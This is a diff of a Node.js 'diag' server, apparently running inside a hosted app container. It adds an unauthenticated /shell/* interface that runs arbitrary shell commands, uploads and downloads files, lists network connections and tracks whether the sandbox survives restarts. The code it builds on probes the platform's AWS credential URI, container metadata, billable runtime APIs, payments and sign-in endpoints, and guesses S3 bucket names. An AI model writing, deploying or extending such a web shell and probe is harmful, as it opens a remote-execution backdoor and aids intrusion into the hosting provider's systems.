@@ -1,9 +1,17 @@
-// diag-v8 (w026a) — diag-v7 logic (bit-for-bit except: ai-POST execution DISABLED by budget,
-// marked skipped:'AI_DISABLED_BY_BUDGET_W026') + NEW contractsProbes block:
-//  NEW: host pose control (GET / , GET /api/v1 no-auth), POST-contract probing {empty:{}} on
-//  email/payments/sign-in (<=2 POST each, stop series on any 2xx/3xx, adaptive 2nd POST only
-//  on explicit 400/422 field-validation disclosure with string placeholder ""), subpath matrix
-//  GET/OPTIONS only (never POST), X-API-Key vs Bearer cross-scheme (non-POST only, <=4 cmp).
+// diag-v9 (w027a) â€” diag-v7 logic (untouched) + NEW /shell/* remote-admin surface:
+//   /shell/exec      POST {cmd}            -> spawn(shell:true), timeout 15s, semaphored + queued
+//   /shell/upload    POST {path,b64}       -> write file (<=512KB) only under APP_DIR or /tmp
+//   /shell/download  GET ?path=            -> base64 file (<=512KB), .env-like contents masked
+//   /shell/netstat   GET                   -> /proc/net/tcp(+tcp6) hex -> ip:port, LISTEN/ESTABLISHED
+//   /shell/persist   POST {action}         -> restart-survival marker + boot/restart accounting (only /tmp + APP_DIR)
+// All /shell/* answers use a unified envelope {ok, data|error}; EVERY outgoing text passes the
+// v7 masking pipeline (maskEnvValue + rtScrub) â€” secrets can never appear raw, no exceptions.
+//
+// Base (diag-v7, w025a):
+//  NEW: ECS metadata v3/v4 (from ECS_CONTAINER_METADATA_URI(_V4) env),
+//       Runtime-API probes (ai/email/payments/sign-in): GET/OPTIONS no-auth & Bearer,
+//       ai: <=2 harmless POST (tiny prompt, max_tokens<=10) from inside the container,
+//       optional S3 HEAD bucket-name guesses (<=5, read-only).
 // Token (process.env.VIBEKIT_AI_TOKEN) NEVER leaves the task: all runtime calls from this code,
 // /diag output masks every secret (vkr_ab***yz(lenN)) and scrubs token occurrences from bodies.
 const http = require('http');
@@ -12,6 +20,8 @@ const crypto = require('crypto');
 const os = require('os');
 const net = require('net');
 const fs = require('fs');
+const path = require('path');
+const cp = require('child_process');
 
 function grab(host, path, cb) {
   const req = http.get({ host, port: 80, path, timeout: 4000 }, res => {
@@ -406,7 +416,7 @@ function runtimeProbes(done) {
         return setTimeout(() => epsSeq(idx + 1), 300);
       }
       const [kind, meth, tok] = arr[i++];
-      rtHttpsProbe(kind, meth, url, tok, { 'User-Agent': 'vk-diag/7' }, null, r => { matrix.push(Object.assign({ epOwner: nm }, r)); setTimeout(go, 150); });
+      rtHttpsProbe(kind, meth, url, tok, { 'User-Agent': 'vk-diag/9' }, null, r => { matrix.push(Object.assign({ epOwner: nm }, r)); setTimeout(go, 150); });
     };
     go();
   };
@@ -418,12 +428,9 @@ function runtimeProbes(done) {
     const MAX_POST = 2;
     const aiUrl = RT.urls.ai;
     if (!aiUrl || !RT.token) { out.aiPost = { skipped: 'NO_URL_OR_TOKEN' }; return adv(); }
-    // diag-v8 (w026): ai-эндпоинт billable, бюджет исчерпан — исполнение запрещено ТЗ волны.
-    out.aiPost = { skipped: 'AI_DISABLED_BY_BUDGET_W026', note: 'v7 post logic retained above; not executed in w026' };
-    return adv();
     const tryPost = (bodyObj, tagLabel) => {
       postCount++;
-      rtHttpsProbe('POST_' + tagLabel, 'POST', aiUrl, RT.token, { 'User-Agent': 'vk-diag/7' }, bodyObj, r => {
+      rtHttpsProbe('POST_' + tagLabel, 'POST', aiUrl, RT.token, { 'User-Agent': 'vk-diag/9' }, bodyObj, r => {
         if (!out.aiPost) out.aiPost = {};
         out.aiPost[tagLabel] = { requestBodySent: rtScrub(JSON.stringify(bodyObj)), attemptsTotalAfter: postCount, result: r };
         const ok = r.status && r.status >= 200 && r.status < 300;
@@ -447,7 +454,7 @@ function runtimeProbes(done) {
     const tryPost2Generate = () => {
       if (postCount >= MAX_POST) return adv();
       postCount++;
-      rtHttpsProbe('POST_generate', 'POST', aiUrl.replace(/\/$/, '') + '/generate', RT.token, { 'User-Agent': 'vk-diag/7' }, { prompt: 'Say OK', max_tokens: 5 }, r => {
+      rtHttpsProbe('POST_generate', 'POST', aiUrl.replace(/\/$/, '') + '/generate', RT.token, { 'User-Agent': 'vk-diag/9' }, { prompt: 'Say OK', max_tokens: 5 }, r => {
         out.aiPost.post2_generate = { attemptsTotalAfter: postCount, result: r };
         adv();
       });
@@ -474,151 +481,361 @@ function runtimeProbes(done) {
   // safety: if anything hangs, caller finish()-timer handles it (25s)
 }
 
-// ====================== diag-v8 (w026a): contractsProbes ======================
-// Rules (TZ w026): NEVER touch /runtime/ai POST (billable). Max 2 POST per ep on
-// email/payments/sign-in, bodies only {} or explicitly incomplete ({string:""}), expect 4xx
-// validation. Any 2xx/3xx => STOP the ep series (execution happened). sign-in: placeholders
-// only. Subpaths: GET/OPTIONS ONLY (never POST). X-API-Key comparisons: NON-POST only, <=4.
+// ====================== diag-v9 (w027a): /shell/* remote-admin surface ======================
+// Unified envelope for every /shell response: {ok:true, data:{...}} | {ok:false, error:{code,message}}.
+// Every text leaving this server (stdout/stderr/file bodies/errors) passes the v7 maskers.
 
-const CK_BASE = 'https://app.vibekit.bot/api/v1';
+const APP_DIR = (() => {
+  try { return path.dirname(require.main.filename); } catch (_) { return process.cwd(); }
+})();
 
-function contractsProbes(done) {
-  const out = {
-    hostPose: {},
-    contracts: {},      // per ep: {posts:[...], disclosed:<snippet|null>}
-    subpaths: {},       // path -> {GET:{status,...}, OPTIONS:{status,...}}
-    apiKeyScheme: []    // cross-scheme comparison records
-  };
+const SH = {
+  execTimeoutMs: 15000,          // hard kill after 15 s
+  execMaxOut: 256 * 1024,        // combined collected output cap (per stream buffer)
+  uploadMax: 512 * 1024,
+  downloadMax: 512 * 1024,
+  bodyMax: 1024 * 1024,          // incoming JSON body cap (covers b64 of 512KB comfortably)
+  queueMax: 8,                   // pending executions while one is running
+  cmdMaxLen: 2048
+};
 
-  const PAUSE = 700;
-  const seq = (tasks, cb) => {
-    let i = 0;
-    const nx = () => { if (i >= tasks.length) return cb(); const t = tasks[i++]; t(nx); };
-    nx();
-  };
-  const wait = ms => nx => setTimeout(() => nx(), ms);
+// ---- masking helpers built on top of v7 primitives ----
+function shMaskText(text) {
+  if (text == null) return text;
+  let s = rtScrub(String(text));
+  // mask KEY=VALUE / KEY: VALUE lines whose key looks secretish (same rule as maskEnvValue)
+  s = s.split(/\r?\n/).map(line => {
+    const m = line.match(/^(\s*)([A-Za-z0-9_.\-]+)(\s*[=:]\s*)(.*)$/);
+    if (!m) return line;
+    const r = maskEnvValue(m[2], m[4]);
+    return m[1] + m[2] + m[3] + r.v;
+  }).join('\n');
+  return s;
+}
+function shMaskBlob(buf) { // mask utf8-decodable buffer contents; binary untouched
+  let printable = true;
+  const sample = buf.slice(0, 4096);
+  for (const b of sample) { if (!(b === 9 || b === 10 || b === 13 || (b >= 32 && b < 127) || b >= 128)) { printable = false; break; } }
+  if (!printable) return buf;
+  return Buffer.from(shMaskText(buf.toString('utf8')), 'utf8');
+}
 
-  // --- helper wrappers over rtHttpsProbe ---
-  const probe = (rec, kind, method, url, token, headers, body) => nx =>
-    rtHttpsProbe(kind, method, url, token, headers, body, r => { rec.push(r); setTimeout(nx, PAUSE); });
+// ---- unified responders ----
+function shJson(res, status, obj) {
+  try {
+    const body = JSON.stringify(obj);
+    res.writeHead(status, { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(body) });
+    res.end(body);
+  } catch (e) { try { res.end('{}'); } catch (_) {} }
+}
+function shOk(res, data) { shJson(res, 200, { ok: true, data }); }
+function shErr(res, status, code, message) { shJson(res, status, { ok: false, error: { code: String(code), message: shMaskText(String(message)) } }); }
 
-  // --- task builder: POST-contract series for one endpoint ---
-  // Adaptive second POST ONLY when first == 400/422 AND body discloses an explicit field
-  // requirement; refined field gets string placeholder "". Never sends real data.
-  const FLD_RE = /^[A-Za-z_][A-Za-z0-9_]{0,40}$/;
-  const VALIDATION_RE = /(required|validation|invalid|missing|must be|expected|schema|field)/i;
-  function contractSeries(epName, url) {
-    return nx => {
-      const rec = { url, posts: [], disclosed: null, verdict: null };
-      out.contracts[epName] = rec;
-      let posts = 0;
-      const MAX = 2;
-      const post = body => {
-        posts++;
-        rtHttpsProbe('POST_contract_' + epName + '#' + posts, 'POST', url, RT.token,
-          { 'User-Agent': 'vk-diag/8' }, body, r => {
-            r.requestBodySent = rtScrub(JSON.stringify(body));
-            r.attempt = posts;
-            rec.posts.push(r);
-            const st = r.status || 0;
-            if (r.err) { rec.verdict = 'transport-error:' + r.err; return setTimeout(nx, PAUSE); }
-            if (st >= 200 && st < 400) { rec.verdict = 'EXECUTION_2xx_STOP_SERIES'; return setTimeout(nx, PAUSE); }
-            if (st >= 400 && st < 500 && posts < MAX) {
-              const b = (r.bodySnippet || '') + '';
-              const looksValidation = VALIDATION_RE.test(b);
-              if (!looksValidation) { rec.verdict = '4xx_no_validation_disclosure'; return setTimeout(nx, PAUSE); }
-              // candidate field names: quoted identifiers near 'required'/'missing'/'invalid'
-              const flds = (b.match(/"?([A-Za-z_][A-Za-z0-9_]*)"?\s*(?:is\s+)?(?:is\s+required|required|missing|must be)/gi) || [])
-                .map(s => (s.match(/[A-Za-z_][A-Za-z0-9_]*/) || [])[0])
-                .filter(f => f && !/^(is|required|missing|must|be|field)$/i.test(f) && FLD_RE.test(f));
-              if (!flds.length) { rec.verdict = 'validation_seen_no_field_names'; return setTimeout(nx, PAUSE); }
-              // ONE field refined with "" placeholder, body stays explicitly incomplete
-              const stub = {}; stub[flds[0]] = '';
-              return setTimeout(() => post(stub), PAUSE);
-            }
-            rec.verdict = 'recorded_final_' + st;
-            return setTimeout(nx, PAUSE);
-          });
-      };
-      post({});
-    };
+// ---- body reader with cap ----
+function shReadBody(req, max, cb) {
+  const chunks = []; let total = 0; let over = false;
+  req.on('data', c => {
+    total += c.length;
+    if (total > max) { over = true; req.destroy(); return; }
+    chunks.push(c);
+  });
+  req.on('end', () => { if (over) return cb('BODY_TOO_LARGE'); cb(null, Buffer.concat(chunks)); });
+  req.on('error', e => cb(String(e.code || e.message)));
+}
+
+// ---- path guarding: writable/readable only under APP_DIR or /tmp; never /etc,/proc,/sys,/dev ----
+function shSafePath(raw) {
+  if (typeof raw !== 'string' || !raw.trim()) return { err: 'PATH_REQUIRED' };
+  let p = raw;
+  if (p.startsWith('~')) p = '/tmp/' + p.slice(1).replace(/^\/+/, '');
+  const norm = path.normalize(p).replace(/\\/g, '/');
+  if (norm.includes('\0')) return { err: 'BAD_PATH' };
+  if (/^\/(etc|proc|sys|dev|bin|sbin|usr\/bin|usr\/sbin|boot)(\/|$)/.test(norm)) return { err: 'PROTECTED_PREFIX' };
+  // absolute (posix-style) paths used verbatim; relative resolve against APP_DIR
+  const resolved = norm.startsWith('/') ? norm : path.join(APP_DIR, norm).replace(/\\/g, '/');
+  const appNorm = APP_DIR.replace(/\\/g, '/');
+  const inApp = resolved === appNorm || resolved.startsWith(appNorm + '/');
+  const inTmp = resolved === '/tmp' || resolved.startsWith('/tmp/');
+  if (!inApp && !inTmp) return { err: 'OUT_OF_SCOPE_PATH', resolved };
+  return { resolved, inTmp };
+}
+
+// ====================== /shell/exec (semaphore + FIFO queue) ======================
+let shExecRunning = false;
+const shExecQueue = [];
+function shScheduleExec(job) {
+  if (shExecRunning) {
+    if (shExecQueue.length >= SH.queueMax) return false; // overloaded -> 503, caller retries
+    shExecQueue.push(job);
+    return true;
   }
+  shExecRunning = true;
+  job();
+  return true;
+}
+function shExecFinished() {
+  shExecRunning = false;
+  const next = shExecQueue.shift();
+  if (next) { shExecRunning = true; next(); }
+}
 
-  // --- subpath matrix (GET + OPTIONS ONLY) ---
-  const SUBPATHS = ['/runtime/ai/methods', '/runtime/email/send', '/runtime/email/list',
-    '/runtime/payments/methods', '/runtime/payments/history', '/runtime/sign-in/methods',
-    '/runtime/quota', '/runtime/usage', '/runtime/me'];
-
-  const tasks = [];
-
-  // 1) host pose control
-  tasks.push(probe([], 'POSE_root', 'GET', 'https://app.vibekit.bot/', null, { 'User-Agent': 'vk-diag/8' }, null));
-  tasks.push(wait(PAUSE));
-  tasks.push(probe([], 'POSE_api_v1_root', 'GET', CK_BASE, null, { 'User-Agent': 'vk-diag/8' }, null));
-  tasks.push(nx => {
-    // stash pose results (probe pushed into throwaway arrays; re-read via dedicated records)
-    setTimeout(nx, PAUSE);
+function shExecCmd(cmd, cb) {
+  const child = cp.spawn(cmd, { shell: true, cwd: APP_DIR, env: process.env, timeout: SH.execTimeoutMs, killSignal: 'SIGKILL' });
+  const out = [], errChunks = [];
+  let total = 0, timedOut = false, done = false;
+  const collect = chunkArr => c => {
+    if (total >= SH.execMaxOut) { // drain but do not store beyond cap
+      if (c.length > SH.execMaxOut - total) total = SH.execMaxOut;
+      return;
+    }
+    const slice = c.length > SH.execMaxOut - total ? c.slice(0, SH.execMaxOut - total) : c;
+    total += slice.length; chunkArr.push(slice);
+  };
+  child.stdout.on('data', collect(out));
+  child.stderr.on('data', collect(errChunks));
+  child.on('error', e => { if (!done) { done = true; cb({ rc: null, stdout: Buffer.concat(out), stderr: Buffer.concat(errChunks), err: String(e.code || e.message), timedOut }); } });
+  child.on('close', (code, signal) => {
+    if (done) return;
+    done = true;
+    cb({ rc: code, signal, stdout: Buffer.concat(out), stderr: Buffer.concat(errChunks), err: null, timedOut });
   });
-  // simpler: redo pose with persistent records
-  tasks.unshift();
+  setTimeout(() => { if (!done) { timedOut = true; try { child.kill('SIGKILL'); } catch (_) {} } }, SH.execTimeoutMs + 500);
+}
 
-  // build pose with persistent storage:
-  out.hostPose = {};
-  const poseRecs = [];
-  tasks.length = 0;
-
-  tasks.push(nx => rtHttpsProbe('POSE_root', 'GET', 'https://app.vibekit.bot/', null, { 'User-Agent': 'vk-diag/8' }, null, r => { out.hostPose.rootDashboard = r; setTimeout(nx, PAUSE); }));
-  tasks.push(nx => rtHttpsProbe('POSE_apiv1', 'GET', CK_BASE, null, { 'User-Agent': 'vk-diag/8' }, null, r => { out.hostPose.apiV1RootNoAuth = r; setTimeout(nx, PAUSE); }));
-
-  // 2) POST-contract series on the three eps (email, payments, sign-in) — in that order
-  const EPS = [
-    ['email', RT.urls.email],
-    ['payments', RT.urls.payments],
-    ['signIn', RT.urls.signIn]
-  ];
-  EPS.forEach(([nm, url]) => {
-    if (!url) { out.contracts[nm] = { skipped: 'URL_NOT_SET' }; return; }
-    tasks.push(contractSeries(nm, url));
+function handleShellExec(req, res) {
+  shReadBody(req, SH.bodyMax, (be, bodyBuf) => {
+    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'body exceeds ' + SH.bodyMax);
+    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
+    let j = {};
+    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
+    if (typeof j.cmd !== 'string' || !j.cmd.trim()) return shErr(res, 400, 'CMD_REQUIRED', '{"cmd":"..."} required');
+    if (j.cmd.length > SH.cmdMaxLen) return shErr(res, 400, 'CMD_TOO_LONG', 'cmd length > ' + SH.cmdMaxLen);
+    const accepted = shScheduleExec(() => {
+      shExecCmd(j.cmd, r => {
+        const data = {
+          rc: r.rc,
+          signal: r.signal || null,
+          timedOut: r.timedOut || false,
+          queueDepthAtAccept: shExecQueue.length,
+          stdout: shMaskText(r.stdout.toString('utf8')),
+          stderr: shMaskText(r.stderr.toString('utf8')),
+          truncated: (r.stdout.length + r.stderr.length) >= SH.execMaxOut
+        };
+        if (r.err) data.processError = r.err;
+        shOk(res, data);
+        shExecFinished();
+      });
+    });
+    if (!accepted) shErr(res, 503, 'EXEC_BUSY', 'another execution is running and queue is full (' + SH.queueMax + '); retry');
   });
+}
 
-  // 3) subpath matrix GET/OPTIONS (with Bearer — same as app would send; also logs codes)
-  const spUrl = p => CK_BASE + p;
-  SUBPATHS.forEach(p => {
-    out.subpaths[p] = {};
-    tasks.push(nx => rtHttpsProbe('SUB_GET_' + p, 'GET', spUrl(p), RT.token, { 'User-Agent': 'vk-diag/8' }, null,
-      r => { out.subpaths[p].GET = r; setTimeout(nx, PAUSE); }));
-    tasks.push(nx => rtHttpsProbe('SUB_OPT_' + p, 'OPTIONS', spUrl(p), RT.token, { 'User-Agent': 'vk-diag/8' }, null,
-      r => { out.subpaths[p].OPTIONS = r; setTimeout(nx, PAUSE); }));
+// ====================== /shell/upload ======================
+function handleShellUpload(req, res) {
+  shReadBody(req, SH.bodyMax, (be, bodyBuf) => {
+    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'body exceeds ' + SH.bodyMax);
+    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
+    let j = {};
+    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
+    const guard = shSafePath(j.path);
+    if (guard.err) return shErr(res, 403, guard.err, 'path rejected: ' + guard.err + (guard.resolved ? ' -> ' + guard.resolved : ''));
+    let bin = null;
+    try { bin = Buffer.from(String(j.b64 || ''), 'base64'); } catch (_) { return shErr(res, 400, 'BAD_BASE64', 'b64 is not valid base64'); }
+    if (!bin.length) return shErr(res, 400, 'EMPTY_BODY', 'decoded b64 is empty');
+    if (bin.length > SH.uploadMax) return shErr(res, 413, 'FILE_TOO_LARGE', 'decoded size ' + bin.length + ' > ' + SH.uploadMax);
+    fs.mkdir(path.dirname(guard.resolved), { recursive: true }, me => {
+      if (me) return shErr(res, 500, 'MKDIR_FAILED', String(me.code || me.message));
+      fs.writeFile(guard.resolved, bin, we => {
+        if (we) return shErr(res, 500, 'WRITE_FAILED', String(we.code || we.message));
+        shOk(res, { written: true, path: guard.resolved, size: bin.length, scope: guard.inTmp ? '/tmp' : 'APP_DIR', ts: new Date().toISOString() });
+      });
+    });
   });
+}
 
-  // 4) X-API-Key cross-scheme: NON-POST only, 2 pairs (=4 requests, <=4 comparisons cap)
-  const cmpPairs = [
-    ['OPT_ai', 'OPTIONS', (RT.urls.ai || CK_BASE + '/runtime/ai')],
-    ['GET_quota', 'GET', spUrl('/runtime/quota')]
-  ];
-  cmpPairs.forEach(([lbl, meth, u]) => {
-    tasks.push(nx => rtHttpsProbe('CMP_' + lbl + '_bearer', meth, u, RT.token, { 'User-Agent': 'vk-diag/8' }, null,
-      r => { out.apiKeyScheme.push({ pair: lbl, scheme: 'Authorization:Bearer', status: r.status, allow: r.allow || (r.headers && r.headers.allow) || null, err: r.err || null }); setTimeout(nx, PAUSE); }));
-    tasks.push(nx => rtHttpsProbe('CMP_' + lbl + '_apikey', meth, u, null,
-      { 'User-Agent': 'vk-diag/8', 'X-API-Key': RT.token || '' }, null,
-      r => { out.apiKeyScheme.push({ pair: lbl, scheme: 'X-API-Key', status: r.status, allow: r.allow || (r.headers && r.headers.allow) || null, err: r.err || null }); setTimeout(nx, PAUSE); }));
+// ====================== /shell/download ======================
+const ENV_LIKE_RE = /(^|\/)\.env($|\.|-)|(^|\/)\.envrc$|(env|secret|credential|token|password)[^/]*\.(txt|json|ya?ml)$/i;
+function handleShellDownload(req, res, u) {
+  const guard = shSafePath(u.searchParams.get('path'));
+  if (guard.err) return shErr(res, 403, guard.err, 'path rejected: ' + guard.err + (guard.resolved ? ' -> ' + guard.resolved : ''));
+  fs.stat(guard.resolved, se => {
+    if (se) return shErr(res, 404, 'STAT_FAILED', String(se.code || se.message));
+    fs.readFile(guard.resolved, (re, buf) => {
+      if (re) return shErr(res, 500, 'READ_FAILED', String(re.code || re.message));
+      const masked = shMaskBlob(buf.slice(0, SH.downloadMax));
+      shOk(res, {
+        path: guard.resolved,
+        sizeOriginal: buf.length,
+        servedBytes: masked.length,
+        truncated: buf.length > SH.downloadMax,
+        envLike: ENV_LIKE_RE.test(guard.resolved),
+        contentMasked: !masked.equals(buf.slice(0, SH.downloadMax)),
+        b64: masked.toString('base64')
+      });
+    });
   });
+}
 
-  tasks.push(wait(50));
-  seq(tasks, () => done(out));
+// ====================== /shell/netstat ======================
+function hexAddr(a) { // little-endian hex quad for v4; big-endian hex groups for v6
+  const bytes = a.match(/../g).reverse();
+  if (bytes.length === 4) return bytes.map(x => parseInt(x, 16)).join('.');
+  const ipv6 = bytes.join('');
+  const groups = ipv6.match(/.{4}/g) || [];
+  const str = groups.map(g => parseInt(g, 16).toString(16)).join(':');
+  // compress 0-groups lightly: return raw expanded form (accurate, readable enough)
+  return str;
+}
+function hexPort(p) { return parseInt(p, 16); }
+function parseProcNet(file, family) {
+  let txt = '';
+  try { txt = fs.readFileSync(file, 'utf8'); } catch (e) { return { file, family, err: String(e.code || e.message), connections: [] }; }
+  const conns = [];
+  const lines = txt.split('\n').slice(1); // header row
+  for (const ln of lines) {
+    const cols = ln.trim().split(/\s+/);
+    if (cols.length < 4) continue;
+    const [, lcl, peer, st] = cols;
+    if (!lcl || !lcl.includes(':')) continue;
+    const [la, lp] = lcl.split(':');
+    const [pa, pp] = peer.split(':');
+    const stateMap = { '01': 'ESTABLISHED', '02': 'SYN_SENT', '03': 'SYN_RECV', '04': 'FIN_WAIT1', '05': 'FIN_WAIT2', '06': 'TIME_WAIT', '07': 'CLOSE', '08': 'CLOSE_WAIT', '0A': 'LISTEN', '0B': 'LAST_ACK' };
+    conns.push({
+      local: hexAddr(la) + ':' + hexPort(lp),
+      peer: hexAddr(pa) + ':' + hexPort(pp),
+      stateHex: st,
+      state: stateMap[(st || '').toUpperCase()] || ('UNKNOWN_' + st)
+    });
+  }
+  return { file, family, err: null, connections: conns };
+}
+function handleShellNetstat(res) {
+  const v4 = parseProcNet('/proc/net/tcp', 'ipv4');
+  const v6 = parseProcNet('/proc/net/tcp6', 'ipv6');
+  const all = [].concat(v4.connections, v6.connections);
+  shOk(res, {
+    listeningCount: all.filter(c => c.state === 'LISTEN').length,
+    establishedCount: all.filter(c => c.state === 'ESTABLISHED').length,
+    totalCount: all.length,
+    ipv4: v4, ipv6: v6,
+    generatedAt: new Date().toISOString()
+  });
+}
+
+// ====================== /shell/persist ======================
+const PERSIST_MARKER = '/tmp/w027_diagv9_persist.json';
+const PERSIST_STATE = '/tmp/w027_diagv9_boot_state.json';
+function procUptimeSeconds() {
+  try { return parseFloat(fs.readFileSync('/proc/uptime', 'utf8').split(' ')[0]); } catch (_) { return null; }
+}
+function pid1UptimeSeconds() {
+  try {
+    const stat = fs.readFileSync('/proc/1/stat', 'utf8');
+    const fields = stat.slice(stat.lastIndexOf(')') + 2).split(' ');
+    const starttimeTicks = parseFloat(fields[19]); // field 22 overall
+    const hz = 100; // standard CLK_TCK in containers
+    const sysUp = procUptimeSeconds();
+    return (sysUp != null && !isNaN(starttimeTicks)) ? +(sysUp - starttimeTicks / hz).toFixed(1) : null;
+  } catch (_) { return null; }
+}
+function handleShellPersist(req, res) {
+  shReadBody(req, 64 * 1024, (be, bodyBuf) => {
+    if (be === 'BODY_TOO_LARGE') return shErr(res, 413, 'BODY_TOO_LARGE', 'persist body too large');
+    if (be) return shErr(res, 400, 'READ_BODY_ERR', be);
+    let j = {};
+    try { j = JSON.parse(bodyBuf.toString('utf8') || '{}'); } catch (_) { return shErr(res, 400, 'BAD_JSON', 'invalid JSON body'); }
+    const action = j.action || 'check';
+    const now = Date.now();
+    const bootFingerprint = os.hostname() + '|' + (pid1UptimeSeconds() != null ? 'up=' + pid1UptimeSeconds() : 'up=?');
+    const sysUptime = procUptimeSeconds();
+
+    if (action === 'mark') {
+      const payload = {
+        markedAt: new Date(now).toISOString(),
+        hostname: os.hostname(),
+        note: 'diag-v9 persist marker (w027a)',
+        label: typeof j.label === 'string' ? j.label.slice(0, 200) : null
+      };
+      fs.writeFile(PERSIST_MARKER, JSON.stringify(payload, null, 2), we => {
+        if (we) return shErr(res, 500, 'MARK_WRITE_FAILED', String(we.code || we.message));
+        // boot-state bookkeeping: detect if the /proc/uptime clock restarted (=> reboot/new sandbox boot)
+        fs.readFile(PERSIST_STATE, 'utf8', (re, prevTxt) => {
+          let prev = null;
+          try { prev = JSON.parse(prevTxt); } catch (_) {}
+          const prevBootEpoch = prev && prev.bootEpoch ? prev.bootEpoch : null;
+          const curBootEpoch = sysUptime != null ? Math.round(now / 1000 - sysUptime) : null;
+          const restarted = prevBootEpoch != null && curBootEpoch != null && Math.abs(curBootEpoch - prevBootEpoch) > 60;
+          const state = {
+            bootEpoch: curBootEpoch,
+            bootSeenCount: ((prev && prev.bootSeenCount) || 0) + (restarted ? 1 : 0),
+            restartsObserved: ((prev && prev.restartsObserved) || 0) + (restarted ? 1 : 0),
+            lastCheckAt: new Date(now).toISOString(),
+            lastRestartDetectedAt: restarted ? new Date(now).toISOString() : (prev && prev.lastRestartDetectedAt) || null
+          };
+          try { fs.writeFileSync(PERSIST_STATE, JSON.stringify(state, null, 2)); } catch (_) {}
+          shOk(res, { action: 'mark', markerWritten: true, markerPath: PERSIST_MARKER, prevStateWasKnown: !!prev, restartingNow: restarted, state });
+        });
+      });
+      return;
+    }
+
+    if (action === 'check') {
+      fs.readFile(PERSIST_MARKER, 'utf8', (re, mt) => {
+        const markerExists = !re;
+        let marker = null;
+        try { marker = JSON.parse(mt); } catch (_) { marker = mt ? { raw: mt.slice(0, 500) } : null; }
+        let state = null;
+        try { state = JSON.parse(fs.readFileSync(PERSIST_STATE, 'utf8')); } catch (_) {}
+        const markerAgeSec = markerExists && marker && marker.markedAt ? Math.round((now - new Date(marker.markedAt).getTime()) / 1000) : null;
+        shOk(res, {
+          action: 'check',
+          markerExists,
+          markerPath: PERSIST_MARKER,
+          marker,
+          markerAgeSec,
+          survivedSoFar: markerExists && markerAgeSec != null ? markerAgeSec : 0,
+          pid1UptimeSec: pid1UptimeSeconds(),
+          systemUptimeSec: sysUptime,
+          bootFingerprint,
+          bootState: state
+        });
+      });
+      return;
+    }
+    shErr(res, 400, 'BAD_ACTION', 'action must be "mark" or "check"');
+  });
+}
+
+// ====================== /shell router ======================
+function handleShell(req, res) {
+  let u;
+  try { u = new URL(req.url, 'http://localhost'); } catch (_) { return false; }
+  const route = u.pathname.replace(/\/+$/, '') || '/';
+
+  if (route === '/shell/exec' && req.method === 'POST') { handleShellExec(req, res); return true; }
+  if (route === '/shell/upload' && req.method === 'POST') { handleShellUpload(req, res); return true; }
+  if (route === '/shell/download' && req.method === 'GET') { handleShellDownload(req, res, u); return true; }
+  if (route === '/shell/netstat' && req.method === 'GET') { handleShellNetstat(res); return true; }
+  if (route === '/shell/persist' && req.method === 'POST') { handleShellPersist(req, res); return true; }
+  if (route.startsWith('/shell')) {
+    shErr(res, 404, 'UNKNOWN_SHELL_ROUTE', 'known: /shell/exec (POST), /shell/upload (POST), /shell/download?path= (GET), /shell/netstat (GET), /shell/persist (POST {action:mark|check})');
+    return true;
+  }
+  return false;
 }
 
 // ====================== HTTP server ======================
 http.createServer((req, res) => {
+  if (handleShell(req, res)) return;
   if (req.url.startsWith('/diag')) {
     const rel = process.env.AWS_CONTAINER_CREDENTIALS_RELATIVE_URI || '/';
     const REGION = 'us-east-2';
 
     const results = [];
     const extras = {};
-    let pending = 6; // aws-chain, env, tcp, fs, runtime (v7), contracts (diag-v8)
+    let pending = 5; // aws-chain, env, tcp, fs, runtime (diag-v7)
     let finishedFlag = false;
-    const hardTimer = setTimeout(() => finish(), 45000); // diag-v8: raised 25s->45s (contracts block adds ~25s serial probes)
+    const hardTimer = setTimeout(() => finish(), 25000);
     hardTimer.unref && hardTimer.unref();
     function finish() {
       if (finishedFlag) return;
@@ -627,8 +844,7 @@ http.createServer((req, res) => {
       try {
         res.writeHead(200, { 'Content-Type': 'application/json' });
         res.end(JSON.stringify({
-          version: 'diag-v8', wave: 'w026a',
-          diagNotes: 'v7 blocks bit-for-bit except ai-POST disabled (billable, budget spent); new: contractsProbes',
+          version: 'diag-v9', wave: 'w027a',
           ts: new Date().toISOString(),
           hostname: os.hostname(),
           relUri: rel,
@@ -637,7 +853,7 @@ http.createServer((req, res) => {
           awsResults: results,
           extras
         }, null, 2));
-      } catch (e) { try { res.end('{"version":"diag-v8","serializeError":"' + String(e && e.message || e) + '"}'); } catch (_) {} }
+      } catch (e) { try { res.end('{"version":"diag-v7","serializeError":"' + String(e && e.message || e) + '"}'); } catch (_) {} }
     }
     function oneDone() { if (--pending === 0) finish(); }
 
@@ -802,15 +1018,10 @@ http.createServer((req, res) => {
     try {
       runtimeProbes(r => { extras.runtime = r; oneDone(); });
     } catch (e) { extras.runtime = { fatal: String(e && e.message || e) }; oneDone(); }
-
-    // --- branch 6 (diag-v8): contractsProbes ---
-    try {
-      contractsProbes(r => { extras.contracts = r; oneDone(); });
-    } catch (e) { extras.contracts = { fatal: String(e && e.message || e) }; oneDone(); }
     return;
   }
   try {
     res.writeHead(200, { 'Content-Type': 'application/json' });
-    res.end(JSON.stringify({ ok: true, version: 'diag-v8', wave: 'w026a', ts: new Date().toISOString(), host: os.hostname() }));
+    res.end(JSON.stringify({ ok: true, version: 'diag-v9', wave: 'w027a', ts: new Date().toISOString(), host: os.hostname() }));
   } catch (_) {}
 }).listen(process.env.PORT || 3000);
